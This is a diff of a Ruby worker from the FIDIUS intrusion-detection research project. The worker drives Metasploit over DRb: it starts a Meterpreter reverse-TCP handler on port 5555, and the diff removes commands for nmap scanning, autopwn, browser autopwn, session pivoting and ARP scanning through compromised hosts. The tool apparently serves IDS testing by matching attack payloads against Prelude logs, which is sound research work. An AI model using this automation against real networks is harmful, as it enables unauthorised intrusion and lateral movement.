@@ -1,26 +1,56 @@
-require 'rubygems'
-require "#{RAILS_ROOT}/script/worker/loader"
-require "#{RAILS_ROOT}/script/worker/msf_session_event"
-require "#{RAILS_ROOT}/script/worker/prelude_event_fetcher.rb"
-require "#{RAILS_ROOT}/app/helpers/log_matches_helper.rb"
-require "#{RAILS_ROOT}/script/worker/tcpdump_wrapper.rb"
-require 'socket'
-
 require 'drb'
 require 'pp'
 
+# FIDIUS Intrusion Detection with Intelligent User Support.
 module FIDIUS
-  class MSFWorker
-    include LogMatchesHelper
+  # options hash from config/msf.yml
+  MSF_SETTINGS = YAML.load_file(File.join RAILS_ROOT, 'config', 'msf.yml')
+  
+  # options hash from config/database.yml (the current RAILS_ENV, in particular)
+  DB_SETTINGS = YAML.load_file(File.join RAILS_ROOT, 'config', 'database.yml')[RAILS_ENV]
+
+  # This code is a mess...
+  class Boot
+    def initialize
+      require "fidius/msf_worker/commands"
+
+      raise ArgumentError, "could not load config/msf.yml" unless MSF_SETTINGS
+      raise ArgumentError, "could not load config/database.yml" unless DB_SETTINGS
+
+      $:.unshift(File.join MSF_SETTINGS['msf_path'], 'lib')
+      require MSF_SETTINGS["subnet_manager_path"]
+      require 'msf/base'
+      require "fidius/session/msf_session_event"
+
+      require 'fidius/msf_worker/auxillaries/prelude_event_fetcher'
+      require 'fidius/msf_worker/auxillaries/tcpdump_wrapper'
+      require 'log_matches_helper' # app/helpers
+
+      drb_url = FIDIUS::MSF_SETTINGS['drb_url']
+      raise ArgumentError, 'No `drb_url\' in config/msf.yml specified.' unless drb_url
+
+      worker = FIDIUS::MsfWorker.new
+      worker.load_commands
+      DRb.start_service drb_url, worker
+      worker.start
+
+      DRb.thread.join
+      worker.puts 'Exiting.'
+    end
+  end
+
+  class MsfWorker
     PID_FILE = File.join RAILS_ROOT, 'tmp', 'pids', 'msf-worker'
 
     attr_reader :status
 
-    def p *obj # :nodoc:
+    # :nodoc:
+    def p *obj
       pp *obj
     end
-    
-    def puts *obj # :nodoc:
+
+    # :nodoc:
+    def puts *obj
       WorkerLog.establish_connection DB_SETTINGS unless WorkerLog.connected?
       obj.each do |o|
         WorkerLog.create :message => o
@@ -33,16 +63,16 @@ module FIDIUS
 
     def initialize
       @status = 'initializing'
-      puts "Generated new worker object."
+      puts "Generated new worker object and registering commands."
     end
-    
+
     def start
       @status = 'starting'
       puts "Starting. Will listen on #{DRb.uri}..."
       File.open(PID_FILE, 'w') do |f|
         f.puts Process.pid
       end
-      
+
       puts "Initializing MSF..."
       @framework =  Msf::Simple::Framework.create
       puts "Initialized MSF."
@@ -59,24 +89,24 @@ module FIDIUS
 
       handler = FIDIUS::Session::MsfSessionEvent.new
       @framework.events.add_session_subscriber(handler)
-      @prelude_fetcher = PreludeEventFetcher.new
+      @prelude_fetcher = FIDIUS::MsfWorker::Auxillaries::PreludeEventFetcher.new
       load_plugins
 
       puts "Starting tcp reverse handler"
       run_exploit "exploit/multi/handler", {'LHOST' => '0.0.0.0', 'LPORT' => '5555', 'payload' => 'windows/meterpreter/reverse_tcp'}, true
 
       # init TcpDumper
-      if (MSF_SETTINGS.select("/match_prelude_logs").first.value == "true")
-        @tcpdump = TcpDumpWrapper.new(MSF_SETTINGS["/tcpdump_iface"])
-        @tcpdump.deactivate if MSF_SETTINGS.select("/match_prelude_logs").first.value == "false"
-      end
+#      if MSF_SETTINGS["match_prelude_logs"] == "true"
+#        @tcpdump = FIDIUS::TcpDumpWrapper.new MSF_SETTINGS["tcpdump_iface"]
+#        @tcpdump.deactivate if MSF_SETTINGS["match_prelude_logs"] == "false" # XXX: ???
+#      end
       puts "Started."
       @status = 'running'
     end
-    
+
     def stop
       @status = 'stopping'
-      @tcpdump.stop
+#      @tcpdump.stop
 
       puts "Halting..."
       @framework.sessions.each_pair do |i,session|
@@ -90,21 +120,21 @@ module FIDIUS
     end
 
     def exec_task task, async = true
-      cmd = task.module.split
-      command = "cmd_#{cmd.shift}"
-      if commands.include? command
+      cmd_args = task.module.split
+      command = "cmd_#{cmd_args.shift}".to_sym
+      if @@commands.include? command
         if async
           thread = Thread.new do
             begin
               task.progress = 1
               task.status = "running asynchron"
               task.save
-              send command.to_sym, cmd, task
+              send command.to_sym, :args => cmd_args, :task => task
               task.progress = 100
               task.status = "done"
               task.save
             rescue ::Exception
-              puts "Failed executing '#{command}, #{cmd.join ', '}' on task ##{task.id}.", $!, *$!.backtrace
+              puts "Failed executing '#{command}(#{cmd_args.join ', '})' on task ##{task.id}.", $!, *$!.backtrace
               task.progress = -1
               task.status = "failed"
               task.error = $!.to_s
@@ -115,7 +145,7 @@ module FIDIUS
           task.progress = 1
           task.status = "running"
           task.save
-          send command.to_sym, cmd, task
+          send command.to_sym, :args => cmd_args, :task => task
           task.progress = 100
           task.status = "done"
           task.save
@@ -123,159 +153,6 @@ module FIDIUS
       else
         raise "Unknown command: #{command}."
       end
-    end
-
-    def cmd_nmap args, task = nil
-      manager = SubnetManager.new @framework, args[0]
-      manager.run_nmap
-    end
-
-    def cmd_session_install args, task=nil
-      session = get_session_by_uuid @framework.sessions, args[0]
-      return unless session
-      return unless session.type == 'meterpreter'
-      FIDIUS::Session::install_meterpreter(session)
-    end
-
-    def cmd_exec_reconnaissance args, task=nil
-      begin
-        puts "exec reconnaissance"
-        
-        session = get_session_by_uuid @framework.sessions, args[0]
-        puts "session: #{session}"
-        script_path = File.join "#{RAILS_ROOT}", "script","reconnaissance", "reconnaissance.rb"
-        session.execute_file(script_path,"")
-        puts "exec finish"
-      rescue
-        puts $!
-      end
-      puts "fertig"
-    end
-    
-    def cmd_add_route_to_session args, task=nil
-      puts "add_route_to_session"
-      session = get_session_by_uuid @framework.sessions, args[0]
-      return unless session
-      return unless session.type == 'meterpreter'
-      FIDIUS::Session::add_route_to_session(session)
-    end
-
-    def get_session_by_uuid sessions, uuid
-      sessions.each_sorted do |s|
-        if session = sessions.get(s)
-          return session if session.uuid == uuid
-        end
-      end
-    end
-
-    def cmd_autopwn args, task = nil
-      lhost = nil
-      Rex::Socket::SwitchBoard.each do | route | 
-        route.comm.net.config.each_route do | ipaddr | 
-          if (IPAddr.new "#{ipaddr.subnet}/#{ipaddr.netmask}").include? IPAddr.new args[0]
-            lhost = ipaddr.gateway
-          end
-        end
-      end
-      autopwn args[0], lhost, task
-    end
-
-    def cmd_arp_scann_session args, task=nil
-      session = get_session_by_uuid @framework.sessions, args[0]
-      return unless session
-      return unless session.type == 'meterpreter'
-      session.net.config.each_route do |route|
-        # Remove multicast and loopback interfaces
-        next if route.subnet =~ /^(224\.|127\.)/
-        next if route.subnet == '0.0.0.0'
-        next if route.netmask == '255.255.255.255'
-        next if (IPAddr.new "#{route.subnet}/#{route.netmask}").include? IPAddr.new( FIDIUS::Session::get_lhost session)
-        mask = IPAddr.new(route.netmask).to_i.to_s(2).count("1")
-        discovered_hosts = arp_scann(session, "#{route.subnet}/#{mask}")
-        discovered_hosts.each do |hostaddress| 
-          host = Msf::DBManager::Host.find_by_address hostaddress
-          pivot_exploited_host = Msf::DBManager::ExploitedHost.find_by_session_uuid args[0]
-          host.pivot_host_id = pivot_exploited_host.host_id if host != nil and pivot_exploited_host != nil
-          host.save
-        end
-      end
-    end
-    
-    def cmd_tcp_scanner rhost, ports = '1-10000'
-      options = {'RHOSTS' => rhost, 'PORTS' => ports }
-      run_exploit "auxiliary/scanner/portscan/tcp", options
-    end
-
-    def cmd_start_browser_autopwn args, task = nil
-      options = {'LHOST' => args[0], 'SRVHOST' => args[0], 'URIPATH' => '/' }
-      run_exploit "server/browser_autopwn", options
-    end
-
-    def autopwn iprange, lhost, task = nil
-      manager = SubnetManager.new @framework, iprange, 1, nil, lhost
-      my_ip = get_my_ip iprange
-      # tell our prelude fetcher that we want to have all events we generate in
-      # prelude from now on
-      if MSF_SETTINGS.select("/match_prelude_logs").first.value == "true"
-        @prelude_fetcher.attack_started
-        # let tcpdump watch our traffic
-        @tcpdump.start
-      end
-      manager.run_nmap
-      # now stop sniffing traffic
-      if MSF_SETTINGS.select("/match_prelude_logs").first.value == "true"
-        @tcpdump.stop
-        # and read out relevant packets most of them should be
-        # a result of run_nmap
-        @tcpdump.read do |src_ip, src_port, dst_ip, dst_port, payload|
-          # we are interested in traffic, that we generated 
-          if src_ip == my_ip
-            PayloadLog.create(
-              :exploit => "nmap",
-              :payload => payload,
-              :src_addr => src_ip,
-              :dest_addr => dst_ip,
-              :src_port => src_port,
-              :dest_port => dst_port,
-              :task_id => task.id
-            )
-          end
-        end
-      end      
-      # we do not want to use nmap for autopwn
-      s = manager.get_sessions(false) 
-      if MSF_SETTINGS.select("/match_prelude_logs").first.value == "true"
-        @prelude_fetcher.get_events(my_ip).each do |ev|
-          puts "save prelude event #{ev.id}"
-          PreludeLog.create(
-            :task_id => task.id,
-            :payload => ev.payload,
-            :detect_time => ev.detect_time,
-            :dest_ip => ev.dest_ip,
-            :dest_port => ev.dest_port,
-            :src_ip => ev.source_ip,
-            :src_port => ev.source_port,
-            :text => ev.text,
-            :severity => ev.severity,
-            :analyzer_model => ev.analyzer_model,
-            :ident => ev.id
-          )
-        end
-        puts "saving of events finished"
-      end
-
-      # after autopwn finished
-      # we have all payload-logs from metasploit
-      # and all prelude logs
-      # now lets match them against each other for the given task_id
-      if task
-        if MSF_SETTINGS.select("/match_prelude_logs").first.value == "true"
-          puts "Matching Payloads against Prelude logs..."
-          calculate_matches_between_payloads_and_prelude_logs(task.id)
-          puts "Matching done."
-        end
-      end
-      puts "autopwn finished"
     end
 
     def arp_scann(session, cidr)
@@ -303,7 +180,7 @@ module FIDIUS
             if h["return"] == session.railgun.const("NO_ERROR")
               mac = h["pMacAddr"]
               # XXX: in Ruby, we would do
-              #   mac.map{|m| m.ord.to_s 16 }.join ':' 
+              #   mac.map{|m| m.ord.to_s 16 }.join ':'
               # and not
               mac_str = mac[0].ord.to_s(16) + ":" +
                   mac[1].ord.to_s(16) + ":" +
@@ -338,7 +215,7 @@ module FIDIUS
         begin
           task.progress = 0
           task.save
-          if MSF_SETTINGS.select("/match_prelude_logs").first.value == "true"
+          if MSF_SETTINGS["match_prelude_logs"] == "true"
             Msf::Plugin::FidiusLogger.on_log do |caused_by, data, socket|
               my_ip = get_my_ip(socket.peerhost)
               PayloadLog.create(
@@ -361,7 +238,7 @@ module FIDIUS
         end
       end
     end
-  
+
   private
 
     def commands
@@ -440,7 +317,7 @@ module FIDIUS
       opts['host'] =  DB_SETTINGS["host"]
       opts['port'] =  DB_SETTINGS["port"]
       opts['socket'] = DB_SETTINGS["socket"]
-      
+
       # This is an ugly hack for a broken MySQL adapter:
       # http://dev.rubyonrails.org/ticket/3338
       # if (opts['host'].strip.downcase == 'localhost')
@@ -459,32 +336,21 @@ module FIDIUS
 
       puts "Connected to database."
     end
-    
+
     def disconnect_db
       puts "Disconnecting database..."
       @framework.db.disconnect
       puts "Disconnected."
     end
-  
+
     def load_plugins
       begin
-        require "#{RAILS_ROOT}/script/worker/msf_payload_loader.rb"
-        @framework.plugins.load("#{RAILS_ROOT}/script/worker/msf_plugins/payload_logger")
+        require "fidius/msf_plugins/msf_payload_loader.rb"
+        @framework.plugins.load("fidius/msf_plugins/payload_logger")
       rescue ::Exception
         puts "An error occurred while loading plugins", $!, *$!.backtrace
       end
     end
   end
 end
-
-drb_url = MSF_SETTINGS.select("/drb_url")
-raise ArgumentError.new "No 'drb_url' in config/msf.yml specified." unless drb_url
-
-worker = FIDIUS::MSFWorker.new
-DRb.start_service drb_url.first.value, worker
-worker.start
-
-DRb.thread.join
-
-worker.puts "Exiting."
 
